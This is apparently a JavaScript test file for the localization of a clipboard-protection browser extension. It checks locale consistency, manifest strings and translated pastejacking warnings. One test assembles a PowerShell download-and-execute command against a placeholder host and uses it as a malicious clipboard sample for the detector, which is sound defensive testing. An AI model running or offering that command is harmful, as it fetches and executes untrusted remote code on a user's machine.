// 介面多語系（#27）：_locales 的 en 和 zh_TW 一致、程式用到的訊息都存在、manifest 用 __MSG__，英文環境的說明是英文。
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync } from 'node:fs';
import { analyzeCopy } from '../lib/pastejack.js';
import { displayLabel, setMessages, t } from '../lib/i18n.js';
import { readMessages, useLocale } from './locale.js';

const read = (rel) => readFileSync(new URL(rel, import.meta.url), 'utf8');
const LOCALES = ['en', 'zh_TW'];
const placeholders = (m) => [...m.message.matchAll(/\$([a-z0-9_@]+)\$/gi)].map((x) => x[1].toLowerCase()).sort();

// 惡意指令範例在執行時才拼起來（見 pastejack.test.js）。
const j = (...parts) => parts.join('');
const PS_CMD = j('power', 'shell', ' -c "', 'i', 'rm https://example.invalid/x | ', 'i', 'ex"');

test('_locales 只有 en 和 zh_TW，key 一致、都有內容、placeholder 一致', () => {
  assert.deepEqual(readdirSync(new URL('../_locales/', import.meta.url)).sort(), LOCALES);
  const [en, zh] = LOCALES.map(readMessages);
  assert.deepEqual(Object.keys(zh).sort(), Object.keys(en).sort());
  for (const [key, m] of Object.entries(en)) {
    assert.match(key, /^[A-Za-z0-9_]+$/, key); // Chrome 的訊息名稱限制
    for (const loc of [m, zh[key]]) assert.ok(loc.message.trim(), `${key} 是空的`);
    assert.deepEqual(placeholders(zh[key]), placeholders(m), key);
    for (const name of placeholders(m)) {
      assert.ok(m.placeholders?.[name] && zh[key].placeholders?.[name], `${key}: ${name} 沒有定義`);
    }
  }
});

test('manifest 的名稱與說明來自 _locales，長度在 Chrome 的上限內', () => {
  const manifest = JSON.parse(read('../manifest.json'));
  assert.equal(manifest.default_locale, 'en');
  assert.equal(manifest.name, '__MSG_extName__');
  assert.equal(manifest.description, '__MSG_extDescription__');
  assert.ok(manifest.web_accessible_resources[0].resources.includes('lib/i18n.js'));
  for (const loc of LOCALES) {
    const m = readMessages(loc);
    assert.ok(m.extName.message.length <= 75, `${loc} name`);
    assert.ok(m.extDescription.message.length <= 132, `${loc} description: ${m.extDescription.message.length}`);
  }
});

test('程式裡用到的訊息都存在', () => {
  const en = readMessages('en');
  const code = ['../content.js', '../lib/pastejack.js'].map(read).join('\n');
  const used = new Set([
    ...[...code.matchAll(/\bt\(\s*'([A-Za-z0-9_]+)'/g)].map((m) => m[1]),
    ...[...code.matchAll(/'((?:pj_sig|copy_title)_[a-z_]+)'/g)].map((m) => m[1]),
  ]);
  assert.ok(used.size >= 25, `只找到 ${used.size} 個`);
  for (const key of used) assert.ok(en[key], `${key} 不在 _locales/en/messages.json`);
});

test('規則名稱的翻譯對得到規則 id，而且跟桌面版的 CoreStrings 一樣', () => {
  const ids = new Set(['api-keys', 'context', 'gitleaks']
    .flatMap((f) => JSON.parse(read(`../../rules/${f}.json`)).rules.map((r) => r.id)));
  const resx = (lang) => Object.fromEntries([...read(`../../src/ClipGuard.Core/Resources/CoreStrings${lang}.resx`)
    .matchAll(/<data name="RuleLabel_([^"]+)"[^>]*>\s*<value>([^<]*)<\/value>/g)].map((m) => [m[1], m[2]]));
  for (const [loc, lang] of [['en', ''], ['zh_TW', '.zh-TW']]) {
    const desktop = resx(lang);
    const ext = Object.entries(readMessages(loc)).filter(([k]) => k.startsWith('rule_'));
    assert.equal(ext.length, Object.keys(desktop).length, loc);
    for (const [key, m] of ext) {
      const id = [...ids].find((x) => `rule_${x.replace(/-/g, '_')}` === key);
      assert.ok(id, `${key} 對不到規則`);
      assert.equal(m.message, desktop[id], `${loc} ${key}`);
    }
  }
});

test('displayLabel：有翻譯用翻譯，沒有就用偵測器的 label', () => {
  useLocale('en');
  assert.equal(displayLabel({ type: 'api-key', label: '私鑰（PEM）', rule: 'private-key-pem' }), 'Private key (PEM)');
  assert.equal(displayLabel({ type: 'credit-card', label: '信用卡號' }), 'Credit card number');
  assert.equal(displayLabel({ type: 'tw-id', label: '身分證／居留證號' }), 'Taiwan ID / resident certificate number');
  assert.equal(displayLabel({ type: 'api-key', label: 'GitHub token', rule: 'github-token' }), 'GitHub token');
  useLocale('zh_TW');
  assert.equal(displayLabel({ type: 'api-key', label: 'x', rule: 'private-key-pem' }), '私鑰（PEM）');
  assert.equal(displayLabel({ type: 'tw-mobile', label: 'x' }), '手機號碼');
});

test('英文環境的 pastejacking 說明是英文', () => {
  useLocale('en');
  const r = analyzeCopy({ selection: 'npm install foo', written: `${PS_CMD}\n` });
  assert.equal(r.warn, true);
  assert.equal(r.reasons[0], 'What was written to the clipboard differs from the text you selected');
  assert.ok(r.reasons.includes('Content added by the page calls PowerShell'), r.reasons.join(' | '));
  useLocale('zh_TW');
  assert.ok(analyzeCopy({ selection: 'npm install foo', written: PS_CMD }).reasons.includes('網頁加入的內容呼叫 PowerShell'));
});

test('t()：在 Chrome 裡用 chrome.i18n.getMessage，替換規則同 Chrome', () => {
  setMessages({ a: { message: 'x $V$ $$1', placeholders: { v: { content: '$1' } } } });
  assert.equal(t('a', 'y'), 'x y $1');
  assert.equal(t('missing'), '');
  const calls = [];
  globalThis.chrome = { i18n: { getMessage: (key, subs) => { calls.push([key, subs]); return 'from chrome'; } } };
  try {
    assert.equal(t('pj_added', 'z'), 'from chrome');
    assert.deepEqual(calls, [['pj_added', ['z']]]);
  } finally {
    delete globalThis.chrome;
    setMessages(null);
  }
});
